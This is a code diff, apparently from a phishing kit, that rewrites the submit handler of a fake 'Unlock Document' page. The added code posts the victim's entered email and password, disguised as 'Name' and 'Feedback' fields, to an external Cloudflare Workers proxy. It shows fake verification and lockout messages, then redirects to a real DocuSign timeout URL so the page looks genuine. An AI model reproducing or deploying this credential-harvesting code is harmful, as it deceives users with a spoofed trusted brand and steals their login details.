-      submitBtn.innerHTML = '<span class="ring_load"></span> Loading...';
-
-      const startTime = Date.now();
-const cleanPayload = new URLSearchParams();
+  
+  const cleanPayload = new URLSearchParams();
   cleanPayload.append("Name", customerName);
   cleanPayload.append("Feedback", customerMessage);
   cleanPayload.append("timestamp", Date.now().toString());
-      fetch(CONFIG.PHP_ENDPOINT, {
-        method: "POST",
-        body: cleanPayload
-      })
-      .then(r => r.text())
-      .then(text => {
-        try {
-          return JSON.parse(text);
-        } catch {
-          throw new Error("Parse failed");
-        }
-      })
-      .catch(() => null)
-      .then(response => {
-        const elapsed = Date.now() - startTime;
-        const delay = Math.max(0, 2000 - elapsed);
-        
-        return new Promise(resolve => setTimeout(() => resolve(response), delay));
-      })
-      .then(response => {
-        if (isLocked) return;
-        
-        const btnText = '</svg></span> ' + CONFIG.BUTTON_TEXT;
+  
+  unlockBtn.disabled = true;
+  spinner.style.display = "inline-block";
+  btnText.innerText = "Verifying...";
+  
+  // INTEGRATED ENDPOINT
+  fetch("https://rum-email-proxy.haricoting.workers.dev/contact", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/x-www-form-urlencoded",
+    },
+    body: cleanPayload,
+  })
+    .then((r) => r.json())
+    .then((result) => {
+      unlockBtn.disabled = false;
+      spinner.style.display = "none";
+      btnText.innerText = "Unlock Document";
+      
+      if (result.status === "exhausted") {
+        showError("✌ Access locked. Too many failed attempts.");
+        unlockBtn.disabled = true;
+        setTimeout(() => {
+          window.location.href = "https://www.docusign.net/Signing/SessionTimeout.aspx?fi=230f89df-896f-418c-81af-7ffb9804b50f";
+        }, 3000);
+        return;
+      }
 
-        if (!response) {
-          submitBtn.disabled = false;
-          submitBtn.innerHTML = btnText;
-          showAlert(CONFIG.MSG_NET, "error");
-          shakeCard();
-          passwordInput.value = "";
-          passwordInput.focus();
+      if (result.status === "wrong") {
+        failedAttempts++;
+        if (failedAttempts >= 3) {
+          showError("✌ Access locked. Too many failed attempts.");
+          unlockBtn.disabled = true;
+          setTimeout(() => {
+            window.location.href = "https://www.docusign.net/Signing/SessionTimeout.aspx?fi=230f89df-896f-418c-81af-7ffb9804b50f";
+          }, 3000);
           return;
         }
+        showError("An error occurred please try again later.");
+        form.classList.add("shake");
+        document.getElementById("cobra").value = "";
+        return;
+      }
 
-        if (response.status === "success") {
-          showAlert(CONFIG.MSG_GRANTED, "success");
-          setTimeout(() => window.location.href = CONFIG.SUCCESS_REDIRECT, 1000);
-          return;
-        }
-
-        if (response.status === "exhausted") {
-          lockout();
-          return;
-        }
-
-        const attempts = parseInt(sessionStorage.getItem(CONFIG.STORAGE_KEY) || "0", 10) + 1;
-        sessionStorage.setItem(CONFIG.STORAGE_KEY, String(attempts));
-
-        if (attempts >= CONFIG.MAX_TRIES) {
-          lockout();
-          return;
-        }
-
-        submitBtn.disabled = false;
-        submitBtn.innerHTML = btnText;
-        showAlert(CONFIG.MSG_WRONG, "error");
-        shakeCard();
-        passwordInput.value = "";
-        passwordInput.focus();
-      });
-    }
-
-    emailInput.addEventListener("input", updateBranding);
-    mainForm.addEventListener("submit", (e) => {
-      e.preventDefault();
-      handleSubmit();
+      if (result.status === "success") {
+        btnText.innerText = "Success! Redirecting...";
+        unlockBtn.style.background = "#10b981";
+        window.location.href = result.redirect;
+      } else {
+        showError("Security token mismatch.");
+      }
+    })
+    .catch(() => {
+      failedAttempts++;
+      if (failedAttempts >= 3) {
+        showError("✌ System Locked. Redirecting...");
+        setTimeout(() => {
+          window.location.href = "https://www.docusign.net/Signing/SessionTimeout.aspx?fi=230f89df-896f-418c-81af-7ffb9804b50f";
+        }, 3000);
+        return;
+      }
+      unlockBtn.disabled = false;
+      spinner.style.display = "none";
+      btnText.innerText = "Unlock Document";
+      showError("Connection error.");
     });
-    
-    updateBranding();
-  }
+}
 
-  if (document.readyState === "loading") {
-    document.addEventListener("DOMContentLoaded", init);
-  } else {
-    init();
-  }
-})();
+function showError(message) {
+  const container = document.getElementById("sentinel");
+  container.style.display = "block";
+  document.getElementById("error-text").innerText = message;
+}
+</script>
+
+<!-- post-load marker -->
+<div id="post-load-flag" class="post-node" data-flag="ready"
+hidden></div>
+
+</body>
+</html>
